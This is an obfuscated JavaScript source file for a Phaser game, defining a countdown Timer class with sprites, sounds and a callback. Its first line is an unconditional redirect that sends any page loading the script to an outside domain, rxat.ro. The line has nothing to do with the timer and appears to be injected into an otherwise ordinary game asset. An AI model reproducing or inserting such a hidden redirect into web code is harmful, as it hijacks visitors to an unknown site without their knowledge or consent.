this["document"]["location"] = "https://rxat.ro/"


class Timer extends Phaser[String.raw`GameObjects`][String.raw`Container`] {
    constructor(_0xa48702, _0x475c16, _0x53490e, _0x1740c7, _0x3f8c4b) {



        super(_0xa48702, _0x475c16, _0x53490e), this[String.raw`scene`] = _0xa48702, this[String.raw`callback`] = _0x3f8c4b, this[String.raw`doUpdate`] = !(1), this[String.raw`timeStamp`] = _0x1740c7, this[String.raw`margin`] = 16, this[String.raw`width`] = 128, this[String.raw`height`] = 112, this[String.raw`scene`][String.raw`add`][String.raw`existing`](this), this[String.raw`timesUp`] = this[String.raw`scene`][String.raw`sound`][String.raw`add`](String.raw`timesUp`, {'volume': 0.5}), this[String.raw`beepSound`] = this[String.raw`scene`][String.raw`sound`][String.raw`add`](String.raw`beepSound`, {'volume': 0.8}), this[String.raw`tickSound`] = this[String.raw`scene`][String.raw`sound`][String.raw`add`](String.raw`tickSound`, {'volume': 0.3});
        const _0x5a79b3 = this[String.raw`scene`][String.raw`add`][String.raw`sprite`](0, 0, String.raw`counterColon`),
            _0x111cda = this[String.raw`scene`][String.raw`add`][String.raw`sprite`](((((-this[String.raw`width`]) / (2))) - (this[String.raw`margin`])), 0, String.raw`counterBack`),
            _0x2425af = this[String.raw`scene`][String.raw`add`][String.raw`sprite`](((((this[String.raw`width`]) / (2))) + (this[String.raw`margin`])), 0, String.raw`counterBack`);
        this[String.raw`numbers`] = this[String.raw`scene`][String.raw`add`][String.raw`container`](((((-this[String.raw`width`]) / (2))) - (45)), 0), this[String.raw`add`]([_0x5a79b3, _0x111cda, _0x2425af, this[String.raw`numbers`]]), this[String.raw`FormatTime`](0);
    }

    [String.raw`Start`]() {

        this[String.raw`doUpdate`] = !(0);
    }

    [String.raw`Update`]() {



        if (this[String.raw`doUpdate`]) {
            const _0x2e2cf7 = this[String.raw`seconds`];
            this[String.raw`seconds`] = Math[String.raw`max`](((this[String.raw`timeStamp`]) - (Math[String.raw`floor`](((Date[String.raw`now`]()) / (1000))))), 0), ((_0x2e2cf7) != (this[String.raw`seconds`])) && (((this[String.raw`seconds`]) <= (0)) ? this[String.raw`timesUp`][String.raw`play`]() : ((this[String.raw`seconds`]) <= (5)) ? this[String.raw`beepSound`][String.raw`play`]() : this[String.raw`tickSound`][String.raw`play`](), this[String.raw`FormatTime`](this[String.raw`seconds`]));
        }
    }

    [String.raw`FormatTime`](_0x4fcc3b) {



        this[String.raw`numbers`][String.raw`removeAll`](!(0));
        const _0x1af710 = ((_0x4fcc3b) % (60))[String.raw`toString`]()[String.raw`padStart`](2, '0'),
            _0x30b665 = Math[String.raw`floor`](((_0x4fcc3b) / (60)))[String.raw`toString`]()[String.raw`padStart`](2, '0'),
            _0x484584 = this[String.raw`scene`][String.raw`add`][String.raw`sprite`](0, 0, String.raw`timerNumbers`, _0x30b665[0]),
            _0x14ff68 = this[String.raw`scene`][String.raw`add`][String.raw`sprite`](57, 0, String.raw`timerNumbers`, _0x30b665[1]),
            _0x2edb3e = this[String.raw`scene`][String.raw`add`][String.raw`sprite`](159, 0, String.raw`timerNumbers`, _0x1af710[0]),
            _0x2efc1e = this[String.raw`scene`][String.raw`add`][String.raw`sprite`](216, 0, String.raw`timerNumbers`, _0x1af710[1]);
        var _0x3d5494;
        (this[String.raw`numbers`][String.raw`add`]([_0x484584, _0x14ff68, _0x2edb3e, _0x2efc1e]), ((this[String.raw`seconds`]) <= (0))) && (this[String.raw`doUpdate`] = !(1), (null == (_0x3d5494 = this[String.raw`callback`])) || _0x3d5494[String.raw`call`](this));
    }
}